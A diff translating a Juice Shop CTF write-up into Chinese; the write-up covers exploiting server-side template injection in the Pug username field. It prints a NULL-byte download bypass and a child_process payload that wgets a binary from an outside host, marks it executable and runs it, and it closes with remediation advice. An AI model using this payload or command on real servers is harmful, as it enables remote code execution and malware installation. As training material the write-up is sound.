@@ -1,75 +1,74 @@
-# Juice-Shop Write-up: Server-Side Template Injection (SSTi)
+# Juice-Shop Write-up: 服务端模板注入（SSTi）
 
-## Challenge Overview
-**Title:** SSTi  
-**Category:** Server-Side Template Injection (SSTi)  
-**Difficulty:** ⭐⭐⭐⭐⭐⭐ (6/6)  
+## 挑战概述
+**标题：** SSTi  
+**类别：** 服务端模板注入（SSTi）  
+**难度：** ⭐⭐⭐⭐⭐⭐ (6/6)  
 
-The objective of this challenge is to exploit a Server-Side Template Injection (SSTi) vulnerability to "infect" the server with a specially crafted malware.
+本挑战的目标是利用服务端模板注入（SSTi）漏洞，使用特制恶意软件“感染”服务器。
 
-## Tools Used
-- **Web Browser:** For navigating the Juice Shop application.
-- **Developer Tools:** To inspect and manipulate HTML and JavaScript code.
-- **Command Line Tools:** For downloading and executing the malware on the server.
+## 使用工具
+- **Web 浏览器：** 用于浏览 Juice Shop 应用。
+- **开发者工具：** 用于检查和操纵 HTML 与 JavaScript 代码。
+- **命令行工具：** 用于在服务器上下载并执行恶意软件。
 
-## Methodology and Solution
+## 方法与解题过程
 
-### Step 1: Understanding the Challenge
-The challenge hints provide important information:
-- **No Reverse Engineering Required:** The focus is on exploiting SSTi without needing to analyze the malware.
-- **Finding the Malware:** The malware can be found via a Google search for "juicy malware" or by accessing the Juice Shop's FTP quarantine folder.
+### 步骤 1：了解挑战
+挑战提示提供了重要信息：
+- **无需逆向工程：** 重点是利用 SSTi，无需分析恶意软件。
+- **查找恶意软件：** 可通过 Google 搜索“juicy malware”找到，也可从 Juice Shop 的 FTP 隔离文件夹获取。
 
-### Step 2: Locating the Malware
-1. **Google Search:** Searching "juicy malware" on Google leads to the following GitHub repository:
+### 步骤 2：定位恶意软件
+1. **Google 搜索：** 在 Google 上搜索“juicy malware”，可以找到以下 GitHub 仓库：
    - [Juicy Malware on GitHub](https://github.com/juice-shop/juicy-malware)
-2. **FTP Quarantine Folder:** Alternatively, navigate to `127.0.0.1:3000/#/ftp/quarantine` and download the malware using the NULL byte technique (add %2500.md after the URL, refet to previous challenges if needed).
+2. **FTP 隔离文件夹：** 也可以前往 `127.0.0.1:3000/#/ftp/quarantine`，并使用 NULL 字节技术下载恶意软件（在 URL 后添加 %2500.md；如有需要，请参考之前的挑战）。
 
-### Step 3: Preparing the Malware Execution Command
+### 步骤 3：准备恶意软件执行命令
 
-Since Juice Shop is running on my local machine (a Linux system), the goal is to download and execute the malware on this serve. Here is the command that we want the server to execute : 
+由于 Juice Shop 在我的本地 Linux 机器上运行，目标是在该服务器上下载并执行恶意软件。我们希望服务器执行以下命令：
 
-- **Command to execute:** 
+- **待执行命令：**
   ```bash
   wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_amd_64?raw=true && chmod +x malware && ./malware
   ```
 
-This command downloads the malware, makes it executable, and then runs it.
+该命令会下载恶意软件、赋予其可执行权限，然后运行它。
 
-### Step 4: Identifying the SSTi Vulnerability
-After inspecting various parts of the application looking for a page that use template, notably the GitHub page of Juice Shop, the profile page was found to use Pug (formerly Jade) template. Alternatively, you can also try basic template injection in every inputs to find the page that we must exploit.
-- **Pug JS:** It's a templating engine that uses variables like `#{variable}` to render dynamic content.
+### 步骤 4：识别 SSTi 漏洞
+检查应用的不同部分，寻找使用模板的页面，尤其是 Juice Shop 的 GitHub 页面后，发现个人资料页面使用 Pug（以前称为 Jade）模板。也可以在所有输入框中尝试基本模板注入，以找到需要利用的页面。
+- **Pug JS：** 一种使用 `#{variable}` 等形式渲染动态内容的模板引擎。
 
 <img src="../assets/difficulty6/ssti_4.png" alt="github home page" width="600px">
 
-### Step 5: Testing for SSTi
-1. **Injecting Simple Expression:** In the username input field, enter `#{1 + 1}` and click "Set Username".
-   - **Result:** The username is set to `2`, confirming SSTi vulnerability.
+### 步骤 5：测试 SSTi
+1. **注入简单表达式：** 在用户名输入框中输入 `#{1 + 1}`，然后点击“Set Username”。
+   - **结果：** 用户名变为 `2`，证实存在 SSTi 漏洞。
 
 <img src="../assets/difficulty6/ssti_1.png" alt="Basic example" width="600px">
 
-2. **Injecting Dynamix Expression:** Also in the username inpt field, we try more complex payload that involve a command execution : 
+2. **注入动态表达式：** 在用户名输入框中尝试更复杂的、涉及命令执行的载荷：
 
 <img src="../assets/difficulty6/ssti_2.png" alt="whoiam command test" width="600px">
 
-### Step 6: Crafting the Payload
-To execute the malware, we inject a payload that uses the Node.js `child_process` module to execute system commands:
-- **Payload:**
+### 步骤 6：构造载荷
+要执行恶意软件，我们注入一个使用 Node.js `child_process` 模块执行系统命令的载荷：
+- **载荷：**
   ```pug
   #{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_amd_64?raw=true && chmod +x malware && ./malware')}
   ```
 
-### Step 7: Executing the Payload
-1. **Enter Payload:** Input the payload into the username field and submit.
+### 步骤 7：执行载荷
+1. **输入载荷：** 将载荷输入用户名字段并提交。
 
 <img src="../assets/difficulty6/ssti_3.png" alt="payload test" width="600px">
 
-2. **Verification:** The command should execute, downloading and running the malware on the server.
+2. **验证：** 命令应在服务器上执行，下载并运行恶意软件。
 
-## Solution Explanation
-The challenge was solved by exploiting an SSTi vulnerability in the Pug templating engine. By injecting a payload that executes system commands via the Node.js `child_process` module, we were able to download and run the malware, demonstrating the vulnerability.
+## 解题说明
+本挑战利用了 Pug 模板引擎中的 SSTi 漏洞。通过注入调用 Node.js `child_process` 模块执行系统命令的载荷，我们下载并运行了恶意软件，展示了该漏洞。
 
-## Remediation
-- **Input Validation and Sanitization:** Ensure all user inputs are properly validated and sanitized to prevent injection attacks.
-- **Template Engine Security:** Use safe templating practices and avoid rendering untrusted input within templates.
-- **Limit Server Permissions:** Restrict the server's ability to execute system commands and download files from external sources.
-
+## 修复建议
+- **输入验证与清理：** 验证并清理所有用户输入，防止注入攻击。
+- **模板引擎安全：** 使用安全的模板实践，避免在模板中渲染不可信输入。
+- **限制服务器权限：** 限制服务器执行系统命令和从外部来源下载文件的能力。
